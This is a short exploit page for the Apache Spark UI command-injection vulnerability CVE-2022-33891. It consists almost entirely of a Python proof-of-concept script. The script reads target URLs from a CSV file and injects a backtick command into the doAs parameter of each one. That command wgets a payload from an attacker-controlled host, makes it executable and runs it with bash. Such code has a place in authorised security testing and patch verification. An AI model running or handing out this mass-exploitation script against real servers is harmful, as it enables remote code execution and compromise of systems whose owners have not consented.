## Apache Spark UI 命令注入漏洞 [CVE-2022-33891]

> https://github.com/west-wind/CVE-2022-33891
```
import requests, ConfigParser, csv, requests, urllib3, time
import pandas as pd
ua = 'https://github.com/west-wind/cve-2022-33891'

config = ConfigParser.ConfigParser()
config.readfp(open(r'POC.conf'))
yourHost = config.get('PAYLOAD', 'yourHostHere')
yourPayload = config.get('PAYLOAD', 'yourPayloadHere')

def usage():
  print "\nWARNING: This script is inteded to be used for vulnerability testing purposes only. Ensure you're authorised to run your payload on the target prior to using this script!"
  print "\nExit now, if you are not authorised."
  print "\nThis POC expects to receive all targets in a CSV file --> allTargets.csv with one column titled --> targets, ex., http://12.23.45.67:9099 or http://spark.domain.com"
  print "The / will be added by the script."
  print "\nEnter the payload to be executed on the target in the POC.conf file. "
  print "Your host in    --> yourHostHere 'http://my_domain_here.com'"
  print "Your payload in --> yourPayloadHere 'payload.sh'\n\n\n"
  time.sleep(5)

def CVE_2022_33891(target):
  global yourPayload, yourHost, ua
  try:
    url = target + '/?doAs=`wget ' + yourHost + '/' + yourPayload + ' && chmod 755 ' + yourPayload + ' | bash`'
    header = {'User-Agent': ua}
    response = requests.get(url, headers=header, verify=False)
    print "\n[+] URL: ",url,"\n[+] HTTP Status: ",response.status_code,"\n[+] HTTP Text: ",response.text
  except Exception as pocEx:
    print "\n[!] Exception occured: ",pocEx, url

usage()
try:
  df = pd.read_csv('allTargets.csv')
  column1 = df.targets
  for target in column1:
    CVE_2022_33891(target)
except Exception as mainEx:
  print "\nException occured in main: ",mainEx
```
